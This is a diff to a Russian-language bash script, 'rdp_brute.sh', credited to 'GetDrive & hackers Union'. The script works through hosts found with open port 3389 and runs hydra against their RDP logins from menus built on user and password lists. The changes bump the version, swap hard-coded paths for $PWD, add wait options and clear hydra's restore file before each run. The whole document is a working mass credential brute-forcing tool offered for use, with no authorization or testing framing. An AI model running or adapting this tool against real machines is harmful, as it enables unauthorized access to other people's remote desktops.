@@ -4,26 +4,11 @@ clear
 
                                         
 cat << EOF
- 
-               ████████████████████████
-               █─████────██────██──█──█
-               █─████─██─████──███───██
-               █─████────███──█████─███
-               █─████─██─██──██████─███
-               █───██─██─██────████─███
-               ████████████████████─███
-                  ███████████████████
-                  █────██────███────█
-                  █─██─██─██──██─██─█
-                  █────██─██──██────█
-                  █─█─███─██──██─████
-                  █─█─███────███─████
-                  ███████████████████
-                            
+                   
         +-------------------------------------+
         |            Auto  Script             |
         |    by GetDrive & hackers Union      | 
-        |            Version 1.01             |
+        |            Version 1.02             |
         +-------------------------------------+
 
 EOF
@@ -46,6 +31,9 @@ echo ""
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
 
 echo ""
 echo "         Выбрать метод перебора.."
@@ -58,7 +46,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -68,7 +56,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -78,7 +66,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -87,7 +75,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -107,6 +95,10 @@ echo ""
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -118,7 +110,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -128,7 +120,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -138,7 +130,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -147,7 +139,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -160,6 +152,10 @@ if [ $menuoption = "3" ]; then
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -171,7 +167,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -181,7 +177,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -191,7 +187,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -200,7 +196,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -434,6 +430,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -445,7 +445,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -455,7 +455,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -465,7 +465,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -474,7 +474,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -502,6 +502,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -513,7 +517,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -523,7 +527,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -533,7 +537,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -542,7 +546,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -571,6 +575,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -582,7 +590,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -592,7 +600,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -602,7 +610,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -611,7 +619,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -640,6 +648,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -651,7 +663,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -661,7 +673,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -671,7 +683,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -680,7 +692,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -707,6 +719,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -718,7 +734,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -728,7 +744,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -738,7 +754,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -747,7 +763,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -775,6 +791,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -786,7 +806,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -796,7 +816,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -806,7 +826,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -815,7 +835,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -842,6 +862,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -853,7 +877,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -863,7 +887,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -873,7 +897,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -882,7 +906,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -908,6 +932,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -919,7 +947,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -929,7 +957,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -939,7 +967,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -948,7 +976,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -975,6 +1003,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -986,7 +1018,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -996,7 +1028,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1006,7 +1038,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1015,7 +1047,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1043,6 +1075,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
